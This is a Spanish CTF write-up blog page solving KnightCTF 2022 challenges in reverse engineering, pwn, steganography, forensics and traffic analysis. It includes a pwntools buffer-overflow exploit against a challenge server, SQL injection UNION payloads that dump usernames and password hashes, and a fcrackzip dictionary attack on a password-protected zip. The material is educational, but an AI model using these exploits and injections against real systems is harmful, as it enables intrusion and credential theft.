utilizamos herramientas como StegSolve o Forensically, vamos a poder visualizar la flag. wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar chmod +x stegsolve.jar KCTF{Y0U_F0UND_M3} Unknown File Al descomprimir el archivo adjunto, extraeremos un archivo que lleva por nombre unknown file. Así como el enunciado sugiere, no se sabe ante que tipo de archivo nos estamos enfrentando, por lo que comandos como file, no nos serán de utilidad. Lo que podemos hacer es visualizar el contenido del archivo en hexadecimal haciendo uso de xxd, para así conseguir su magic number. xxd unknown\\ file | head Si nos percatamos, el magic number no corresponde con ninguno conocido, sin embargo, podemos observar una sección que dice IHDR, el cual corresponde con uno de los chunks principales de cualquier imagen PNG. De modo que reemplazando los cuatro primeros dígitos con 89 50 4E 47, conseguiremos visualizar la flag; esto podemos hacerlo mediante herramientas online como Online Hex Editor, o ghex, que para instalarlo es bastante sencillo: sudo apt install ghex KCTF{Imag3_H3ad3r_M4nipul4t10N} Let’s Walk Together Al abrir el archivo adjunto no vamos a observar nada relevante, no obstante, el nombre del reto nos da una pista bastante importante. Vamos a hacer uso de binwalk, una herramienta de ingeniería inversa dedicada a identificar archivos y código malicioso en imágenes de firmware. binwalk -e interesting_waves.png Se nos creará una carpeta dentro de la cual estará todo lo que se encontraba dentro de la imagen; entre ello, un archivo .zip protegido por contraseña. En vista de que no tenemos ningún indicio de ninguna contraseña, aplicaremos fuerza bruta sobre el archivo .zip mediante fcrackzip. sudo apt install fcrackzip Para ello necesitaremos de algún diccionario, el más común es rockyou.txt. fcrackzip -D -p /ruta/del/diccionario/rockyou.txt -u 11150.zip -D - Indicamos que queremos hacer un ataque de diccionario -p - Indicamos el diccionario -u - Nos quedamos solamente con la contraseña correcta; descartamos falsos positivos Ya con la contraseña del .zip, podemos extraer el archivo flag.txt. KCTF{BiNw4lk_is_h3lpfUl} Networking Compromised CTF Platform Se nos da una captura de tráfico que bien podemos analizar con TShark o Wireshark. En este caso, como se nos pide averiguar por un nombre de usuario y contraseña, lo más sensato sería filtrar la captura por peticiones de tipo POST. http.request.method == POST Si empezamos a revisar cada petición, veremos que el atacante probó credenciales típicas como admin/admin, admin/admin123, test/test, admin/password devolviendo siempre el servidor un mensaje Invalid Username or Password, hasta que da con las credenciales correctas, demo/demo. KCTF{demo_demo} Robots.txt Como estamos en búsqueda del archivo robots.txt, podemos filtrar la captura de tráfico por peticiones de tipo GET, y posteriormente por todas aquellas que mencionen el archivo que buscamos, esto último lo podemos hacer con CTRL + F. http.request.method == GET KCTF{/includes/users.php} PHP Version Este reto era bastante sencillo, podíamos completarlo a medida que realizábamos otros retos. La versión de PHP podemos visualizarla en cualquier petición que se realice al servidor. KCTF{PHP/7.4.27} KCTF Para este reto no se nos da mayor contexto, sin embargo, si analizamos los objetos HTTP encontraremos una imagen que contiene la flag. KCTF{Ev3rY_USEr_1nPuT_SH0uLD_B3_S4niT1z3D} Admin Arena Nuevamente tenemos que filtrar de la captura de tráfico, información que viaja por POST, en este caso, en la ruta Admin Arena. http.request.method == POST KCTF{tareq@hackerzarena.com_P@$$w0Rd} Vuln A partir de este punto, los retos van enfocados al ataque que se realizó en contra de la plataforma de CTF. Si hemos estado atentos a las diversas peticiones HTTP que se realizaron, nos habremos percatado que hay varias bastante sospechosas. Ya viendo esto podríamos determinar el tipo de ataque que se realizó, SQL Injection, no obstante, al verse url encodeado, puede resultar un poco complicado leer la petición. KCTF{sql_injection} Vuln Columns Para visualizar de mejor manera las inyecciones SQL que se realizaron, podemos exportar los objetos HTTP. Si observamos detenidamente, nos daremos cuenta que el atacante empieza a ordenar las columnas de la base de datos de manera consecutiva, con el objetivo de conocer el total de columnas existentes. Este proceso lo realiza un total de diez veces, en el primer intento hay un pequeño fallo de sintaxis por lo que lo descartamos, y a partir del segundo intento, empieza a ordenar las columnas, una a una, esto lo hace hasta la columna nueve, la cual no existe, razón por la cual, en el décimo intento, vuelve a ordenar las columnas hasta la número ocho. users.php?id=1&#39; order by 1,2,3,4,5,6,7,8 --+ Sabidas el número total de columnas de la base de datos, el atacante empieza a determinar cuales son vulnerables, esto lo hace a través del comando union, con el cual empieza a reemplazar ciertas columnas por otra serie de comandos que le otorgan información relevante de la base de datos. users.php?id=1&#39; union select 1,2,3,4,5,6,7,8 --+ users.php?id=1&#39; union select 1,2,version(),4,5,6,7,8 --+ Una vez analizadas las columnas que el atacante utiliza, podemos determinar que son cuatro, las columnas vulnerables; concretamente, las columnas 3, 6, 7 y 8. KCTF{4} Hashed Password Para este reto se nos pregunta por el hash de la contraseña del usuario tareq, la cual el atacante consiguió haciendo uso de las inyecciones SQL, concretamente: users.php?id=1&#39; union select 1,2,3,group_concat(username,0x203a20,password),5,user(),7,8 from users --+ KCTF{$2Y$10$XVKEZO/NKM4KE073CPTEG.VKFTHMH1CCDPRDD5JWYWKFEZ6GZKZN.} Database Flag Al igual que el reto anterior, se pude asumir que el atacante a través de las inyecciones SQL, logró filtrar información relevante de la plataforma de CTF, en este caso una flag; la inyección en cuestión es: users.php?id=1&#39; union select 1,2,3,4,5,6,group_concat(flag),8 from vulnerable --+ Conseguimos filtrar dos cadenas encriptadas en Base64. S0NURntTcUw= XzFOajNDN2kwbn0= Al desencriptarlas conseguiremos la flag. KCTF{SqL_1Nj3C7i0n} Attacker Finalmente, parece ser que el atacante decidió ‘firmar’ el ataque, dejando su nombre en la última inyección SQL, donde deja un mensaje encriptado en hexadecimal. users.php?id=1&#39; union select 1,2,0x4861636b6564204279204d4f5348,4,5,6,group_concat(flag),8 from vulnerable --+ No obstante, si no queremos desencriptar el mensaje, podemos verlo en texto plano desde el propio Wireshark.","headline":"KnightCTF 2022","mainEntityOfPage":{"@type":"WebPage","@id":"/es/KnightCTF-2022/"},"url":"/es/KnightCTF-2022/"}</script>
<!-- End Jekyll SEO tag -->


  <!-- Google Tag Manager -->
  <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
  })(window,document,'script','dataLayer','GTM-PPKV9V8T');</script>
  <!-- End Google Tag Manager -->

</head>



<body>

  <!-- Google Tag Manager (noscript) -->
  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PPKV9V8T"
  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
  <!-- End Google Tag Manager (noscript) -->

  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1 class="glitch-header">filthyHacker@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/es"><h2 class="header-link">Publicaciones</h2></a>
<a href="/es/search"><h2 class="header-link">Buscar</h2></a>
<a href="/es/archive"><h2 class="header-link">Archivo</h2></a>
<a href="/en"><h2 class="header-link">English</h2></a>

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <h2>KnightCTF 2022</h2>
  <time datetime="2022-01-17T00:00:00-05:00" class="by-line">
    
      17/01/2022
    
  </time>
  <p>KnightCTF 2022, es el primer <em>capture the flag</em> organizado por <a href="https://knightsquad.org/">Knight Squad</a>, este es de tipo <em>jeopardy</em>, por lo que encontraremos distintas categorías.</p>

<div style="text-align:center">
  <img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/1.png" class="blog-image" onclick="expandImage(this)" />
</div>

<h3 id="reverse-engineering"><a href="#header-3"></a>Reverse Engineering</h3>

<h4 id="the-encoder"><a href="#header-4"></a>The Encoder</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/2.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Al extraer y ejecutar el binario, <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/the_encoder.zip">the_encoder.out</a>, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier carácter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/3.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros.</p>

<p>Podemos consultar una <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/4.png">tabla de código ASCII</a>, para saber en que orden van los caracteres, y así simplificar las cosas.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/5.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{s1Mpl3_3Nc0D3r_1337}
</code></pre></div></div>

<h3 id="pwn"><a href="#header-3"></a>PWN</h3>

<h4 id="whats-your-name"><a href="#header-4"></a>What’s Your Name</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/6.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Al extraer y ejecutar el binario, <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/whats_your_name.zip">whats_your_name</a>, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/7.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Si introducimos una cadena de caracteres lo suficientemente larga, conseguiremos un <code class="language-plaintext highlighter-rouge">Segmentation Fault</code>, lo cual nos da la idea de un posible <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/8.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Podemos empezar a depurar el binario con <code class="language-plaintext highlighter-rouge">GEF</code>, tal y como lo hicimos en la máquina <a href="https://mateonitro550.github.io/Safe-Hack-The-Box">Safe</a> de <em>Hack The Box</em>, y nos daremos cuenta que el <em>buffer</em> tiene una longitud de <em>72 bytes</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/9.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Ya con esto en mente, podemos analizar el binario con <code class="language-plaintext highlighter-rouge">Ghidra</code>, y nos daremos cuenta que dentro de la función <code class="language-plaintext highlighter-rouge">main</code>, después de hacer una serie de validaciones, se está efectuando una llamada al sistema para ejecutar un <code class="language-plaintext highlighter-rouge">cat</code> al archivo <code class="language-plaintext highlighter-rouge">/home/hacker/flag.txt</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/10.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>De modo que teniendo control sobre el registro <code class="language-plaintext highlighter-rouge">RIP</code>, si apuntamos a la dirección de la llamada al sistema, omitiremos toda la validación y conseguiremos listar la flag; para ello, haremos un script en <code class="language-plaintext highlighter-rouge">Python</code>, bastante parecido al de la máquina <a href="https://mateonitro550.github.io/Safe-Hack-The-Box">Safe</a> de <em>Hack The Box</em>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">gnome-terminal</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">-x</span><span class="sh">'</span><span class="p">]</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">198.211.115.81</span><span class="sh">"</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x4011d3</span><span class="p">)</span>

<span class="n">junk</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">72</span><span class="p">).</span><span class="nf">encode</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{bAbY_bUfF3r_0v3Rf1Ow}
</code></pre></div></div>

<h3 id="osint"><a href="#header-3"></a>OSINT</h3>

<h4 id="canada-server"><a href="#header-4"></a>Canada Server</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/11.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Este reto es bastante simple, solamente teníamos que hacer una pequeña búsqueda en internet.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/12.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{192.99.167.83}
</code></pre></div></div>

<h4 id="find-the-camera"><a href="#header-4"></a>Find The Camera</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/13.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Una vez descargamos el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/Bus.png">archivo adjunto</a>, vamos a darnos cuenta que los derechos de autor le pertenecen a <code class="language-plaintext highlighter-rouge">JenCh012</code>, así que procedemos a buscarlo.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/14.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Vemos que, aparte de algunas páginas rusas, nuestra búsqueda guarda relación con autobuses, por lo que estamos en el lugar correcto, entraremos en el primer resultado.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/15.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Podemos observar que hay una sección en la que podemos introducir la matrícula del autobús, y posteriormente, nos arrojará un resultado.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/16.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Ambas fotografías curiosamente pertenecen al usuario <code class="language-plaintext highlighter-rouge">JenCh012</code>, por lo que haremos clic en la fotografía que nos interesa.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/17.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Ya con esto habríamos conseguido el modelo de la cámara, ahora solamente haría falta saber a que marca pertenece.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{SONY_DSC_S&amp;980}
</code></pre></div></div>

<h3 id="steganography"><a href="#header-3"></a>Steganography</h3>

<h4 id="follow-the-white-rabbit"><a href="#header-4"></a>Follow The White Rabbit</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/18.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Una vez descargado el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/whiterabbit.jpg">archivo adjunto</a>, podemos darnos cuenta que existe una serie de puntos y líneas, por lo que podemos intuir que estamos frente a <code class="language-plaintext highlighter-rouge">código morse</code>. Para decodificarlo, podemos usar herramientas como <a href="https://www.dcode.fr/codigo-morse">dcode</a>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{L0OKB4Y0UL34P}
</code></pre></div></div>

<h4 id="follow"><a href="#header-4"></a>Follow</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/19.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Cuando empezamos a analizar el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/Follow.pdf">archivo PDF</a> adjunto, rápidamente nos daremos cuenta que existe un espacio en blanco demasiado grande. Por lo que si marcamos el espacio en blanco, nos daremos cuenta que hay algo ahí.</p>

<div style="text-align:center">
  <img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/20.png" class="blog-image" onclick="expandImage(this)" />
</div>

<p>De modo que copiaremos y pegaremos el texto en otro lado, revelando así la flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{This_is_the_real_flag}
</code></pre></div></div>

<h4 id="qr-code-from-the-future"><a href="#header-4"></a>QR Code From The Future</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/21.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Al abrir el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/QR_Code_From_The_Future.gif">archivo adjunto</a>, nos daremos cuenta que estamos frente a una sucesión de códigos QR que cambia bastante rápido, por lo que, lo primero que haremos será identificar cada uno de los <em>frames</em> que componen este <em>GIF</em>, para ello podemos hacer uso de <a href="https://ezgif.com/split">Ezgif</a>.</p>

<p>Una vez hemos conseguido los <em>48 códigos QR</em> que componen el <em>GIF</em>, pasaremos a decodificar cada uno de ellos; para agilizar el proceso haremos uso de <code class="language-plaintext highlighter-rouge">zbarimg</code>, por lo que deberemos de tener descargados todos los <em>códigos QR</em>. En caso de no contar con la herramienta descargada podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install zbar-tools
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zbarimg * | cut -d ":" -f2 | tr -d "\n"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/22.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Una vez escaneados los <em>48 código QR</em> conseguiremos la siguiente cadena de caracteres:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>}pvznalq_bg_pvgngf_zbes_qriybir_gbt_rqbp_ED{SGPX
</code></pre></div></div>

<p>Ligeramente podemos empezar a ver el formato de la flag, de modo que la cadena que acabamos de conseguir, está al revés.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zbarimg * | cut -d ":" -f2 | tac | tr -d "\n"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/23.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>La cadena, está encriptada por <code class="language-plaintext highlighter-rouge">ROT13</code>, por lo que al <a href="https://rot13.com/">decodificarla</a>, conseguiremos la flag:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{QR_code_got_evolved_from_static_to_dynamic}
</code></pre></div></div>

<h3 id="misc"><a href="#header-3"></a>Misc</h3>

<h4 id="unzip-me"><a href="#header-4"></a>Unzip Me</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/24.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Al descomprimir el archivo <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/unzipme.tar.gz">unzipme.tar.gz</a>, extraeremos un archivo que lleva por nombre <code class="language-plaintext highlighter-rouge">unzipme</code>.</p>

<p>El propio nombre del archivo nos sugiere que debemos de descomprimirlo, sin embargo, no conocemos en que formato está comprimido; podríamos hacer uso del comando <code class="language-plaintext highlighter-rouge">file</code>, pero nos dirá que simplemente se trata de <em>data</em>.</p>

<p>Como no conocemos el formato del archivo, podríamos visualizar su contenido en <em>hexadecimal</em> haciendo uso de <code class="language-plaintext highlighter-rouge">xxd</code>, para así conseguir su <code class="language-plaintext highlighter-rouge">magic number</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xxd unzipme
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/25.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Si nos percatamos, cada pareja de dígitos está dada la vuelta; es decir, la forma correcta de los cuatro primeros dígitos debería ser <code class="language-plaintext highlighter-rouge">504B 0304</code>, esto corresponde con el <code class="language-plaintext highlighter-rouge">magic number</code> de los archivos <code class="language-plaintext highlighter-rouge">PKZip</code>. Tenemos una lista completa de <em>magic numbers</em>, de varios tipos de archivos, <a href="https://asecuritysite.com/forensics/magic">aquí</a>.</p>

<p>De este modo, haciendo uso de <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, podemos descomprimir el archivo <code class="language-plaintext highlighter-rouge">unzipme</code>. Lo primero que haremos será indicar que queremos trabajar con el formato <code class="language-plaintext highlighter-rouge">hexdump</code>, y posterior a ello introduciremos el output conseguido con el comando <code class="language-plaintext highlighter-rouge">xxd</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/26.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Luego de esto, indicaremos que queremos cambiar el <code class="language-plaintext highlighter-rouge">endianness</code> cada <em>2 bytes</em>, para finalmente descomprimir el archivo <code class="language-plaintext highlighter-rouge">unzipme</code> y conseguir la flag.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/27.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{sO_yOu_sWaPP3D_tHe_f1L3}
</code></pre></div></div>

<h4 id="look-closely"><a href="#header-4"></a>Look Closely</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/28.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Para este reto se nos da un archivo <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/look%20closely.wav">.wav</a>, del cual no logramos identificar nada. Lo que podemos hacer es visualizar el espectrograma con herramientas como <code class="language-plaintext highlighter-rouge">Audacity</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install audacity
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/29.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://drive.google.com/file/d/1_6c_waS9ijouTpqI_tUO6VCRf7fE6gCY/view?usp=sharing
</code></pre></div></div>

<p>En el enlace encontraremos un video que aparte de verse fatal, contiene dos cadenas de caracteres escritas en binario.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/30.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01001011 01000011 01010100 01000110 01111011 01001000 00110011
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/31.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>01001100 01001100 01001111 01011111 01001010 00110011 01001100 01001100 01001111 01111101 
</code></pre></div></div>

<p>Una vez las unimos, y <a href="https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)">traducimos</a> obtenemos la flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{H3LLO_J3LLO}
</code></pre></div></div>

<h3 id="digital-forensics"><a href="#header-3"></a>Digital Forensics</h3>

<h4 id="the-lost-flag"><a href="#header-4"></a>The Lost Flag</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/32.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>A la hora de abrir el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/Lost%20Flag%20.png">archivo adjunto</a> no vamos a encontrar nada sospechoso a primera vista.</p>

<p>No obstante, si utilizamos herramientas como <code class="language-plaintext highlighter-rouge">StegSolve</code> o <a href="https://29a.ch/photo-forensics/">Forensically</a>, vamos a poder visualizar la flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
chmod +x stegsolve.jar
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/33.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{Y0U_F0UND_M3}
</code></pre></div></div>

<h4 id="unknown-file"><a href="#header-4"></a>Unknown File</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/34.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Al descomprimir el <a href="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/unknown file.zip">archivo adjunto</a>, extraeremos un archivo que lleva por nombre <code class="language-plaintext highlighter-rouge">unknown file</code>.</p>

<p>Así como el enunciado sugiere, no se sabe ante que tipo de archivo nos estamos enfrentando, por lo que comandos como <code class="language-plaintext highlighter-rouge">file</code>, no nos serán de utilidad. Lo que podemos hacer es visualizar el contenido del archivo en <em>hexadecimal</em> haciendo uso de <code class="language-plaintext highlighter-rouge">xxd</code>, para así conseguir su <code class="language-plaintext highlighter-rouge">magic number</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xxd unknown\ file | head
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/35.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<p>Si nos percatamos, el <code class="language-plaintext highlighter-rouge">magic number</code> no corresponde con <a href="https://asecuritysite.com/forensics/magic">ninguno conocido</a>, sin embargo, podemos observar una sección que dice <code class="language-plaintext highlighter-rouge">IHDR</code>, el cual corresponde con uno de los <em>chunks</em> principales de cualquier imagen <code class="language-plaintext highlighter-rouge">PNG</code>.</p>

<p>De modo que reemplazando los cuatro primeros dígitos con <code class="language-plaintext highlighter-rouge">89 50 4E 47</code>, conseguiremos visualizar la flag; esto podemos hacerlo mediante herramientas online como <a href="https://www.onlinehexeditor.com/">Online Hex Editor</a>, o <code class="language-plaintext highlighter-rouge">ghex</code>, que para instalarlo es bastante sencillo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install ghex
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/36.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>KCTF{Imag3_H3ad3r_M4nipul4t10N}
</code></pre></div></div>

<h4 id="lets-walk-together"><a href="#header-4"></a>Let’s Walk Together</h4>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-01-17-KnightCTF-2022/37.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>

